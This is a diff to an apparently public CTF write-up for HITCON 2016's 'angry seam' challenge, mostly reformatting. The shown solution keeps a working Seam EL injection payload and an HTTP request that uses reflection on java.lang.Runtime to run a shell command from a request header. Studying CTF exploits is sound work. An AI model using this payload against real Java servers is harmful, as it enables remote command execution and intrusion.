@@ -190,7 +190,7 @@ Tag: **GrayBox**, **Java**, **Seam Framework**, **CSS RPO**, **EL Injection**, *
 
 #### Source Code
 
-* [here](hitcon-ctf-2016/angry seam)
+* [here](hitcon-ctf-2016/angry%20seam)
 
 #### Solution
 
@@ -220,21 +220,20 @@ Tag: **GrayBox**, **Java**, **Seam Framework**, **CSS RPO**, **EL Injection**, *
 
 * Register an account  
 * Update description to  
-   ```
-   /?x=#{expressions.instance().createValueExpression(request.getHeader('cmd')).getValue()}
-   ```
-
 * Login and access   
 
-   ```
+```
+/?x=#{expressions.instance().createValueExpression(request.getHeader('cmd')).getValue()}
+```
+
+```
 GET /angryseam/template.seam?actionMethod=template.xhtml:util.escape(sessionScope['user'].getDescription()) HTTP/1.1
 host: 1.2.3.4
 cmd: #{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),request.getHeader('ccc'))}
 ccc: ls -alh
-   ...
-   ```
+...
+```
 
-<br>
 
 **Unintended solution**  
 
